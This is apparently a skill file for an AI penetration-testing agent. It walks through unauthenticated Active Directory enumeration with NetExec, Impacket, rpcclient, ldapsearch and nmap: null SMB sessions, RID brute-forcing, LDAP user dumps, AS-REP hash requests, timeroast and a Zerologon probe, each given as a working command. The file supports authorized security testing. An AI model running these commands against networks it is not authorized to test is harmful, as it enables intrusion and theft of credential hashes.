---
name: windows-ad-unauth
description: Unauthenticated Windows/AD enum — NetExec identity, null/guest SMB, RPC/LDAP user listing, AS-REP, Kerberos user enum, DNS SRV, Pre-Win2k computers. Use before any password.
metadata:
  version: '1.0'
---

# Unauthenticated AD enum

No domain password. Prefer `run_nxc` then Impacket. Stop and record when a technique works; do not spray.

## 1. SMB identity

```
run_nxc protocol=smb target=<ip>
```

Parse: NetBIOS name, `(domain:…)`, `(signing:True|False)`, `(SMBv1:…)`, OS. Signing required ⇒ likely DC or hardened member. Signing **false** ⇒ relay candidate (`windows-coerce-relay`). SMBv1 ⇒ extra finding.

## 2. Anonymous / guest SMB

```
run_nxc protocol=smb target=<ip> extra_args=["--users"]
run_nxc protocol=smb target=<ip> extra_args=["-u","a","-p","","--shares"]
run_nxc protocol=smb target=<ip> extra_args=["-u","","-p","","--shares"]
```

`[+] DOMAIN\guest` or `[+] DOMAIN\` with share list ⇒ **finding** (anonymous listing). `--rid-brute` only on a single host if `--users` is empty (noisy).

Shares: `IPC$` alone is normal. Non-default readable shares (`wwwroot`, `backup`, `sysvol` without auth, `NETLOGON` with files, `users`) ⇒ finding + download interesting files via `run_python` `smbclient.py`.

## 3. RPC / SAMR null session

```python
# run_python — enum4linux-ng or rpcclient
# rpcclient -U "" -N <ip>
# rpcclient $> enumdomusers
# rpcclient $> enumdomgroups
# rpcclient $> querydispinfo
```

RID cycling via `lookupsid.py <ip>` (null). Full user list from SAMR is high value — save as domain knowledge (usernames for AS-REP / Kerberoast).

## 4. LDAP anonymous

```bash
ldapsearch -x -H ldap://<dc-ip> -s base namingContexts
ldapsearch -x -H ldap://<dc-ip> -b "DC=corp,DC=local" '(objectClass=user)' sAMAccountName
```

Anonymous rootDSE or user dump ⇒ finding. Also try LDAPS `ldaps://<dc-ip>:636` if 389 is closed.

## 5. DNS SRV (find DCs without guessing)

```python
import dns.resolver
r = dns.resolver.Resolver(configure=False)
r.nameservers = ["<dc-ip>"]
for q in [
    "_ldap._tcp.dc._msdcs.<domain>",
    "_kerberos._tcp.<domain>",
    "_gc._tcp.<domain>",
]:
    print(q, r.resolve(q, "SRV"))
```

Record DC FQDNs as `DNS_NAME` on the **existing IP** target. Do not create new project targets.

## 6. Kerberos without creds

Load `windows-kerberos`. Minimum:

```
GetNPUsers.py <domain>/ -no-pass -usersfile users.txt -dc-ip <dc-ip> -request
# nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=users.txt <dc-ip>
```

AS-REP hash ⇒ finding + domain knowledge. Do not crack.

## 7. Extra unauth (often missed)

- **Pre-Windows 2000 computers:** `nxc ldap <dc-ip> -u '' -p '' --pre-windows-2000` or search `userAccountControl` + `samAccountName` ending `$` created with blank password.
- **timeroast:** `nxc smb <ip> --timeroast` (NTP/computer hashes; low yield, cheap).
- **WebClient / WebDAV:** if 80/443 on a member, note for HTTP coerce later.
- **MS-RPC endpoints:** `impacket-rpcdump <ip>` — print spooler (spoolss) present ⇒ coerce candidate.
- **Zerologon (CVE-2020-1472):** unauth netlogon on DCs. Probe only (`nxc smb <dc> -M zerologon`); do **not** reset the machine password unless operator explicitly wants destructive DC recovery.
- **noPac / samAccountName spoof (CVE-2021-42278/42287):** needs a domain user — defer to `windows-ad-auth`.
- **PrintNightmare unauth:** usually needs a user; note spooler + old print service.

## Users file

Build `users.txt` from: nxc `--users`, SAMR, LDAP, description fields, `krb5-enum-users`. Deduplicate lowercase. Never password-spray this list unauthenticated.
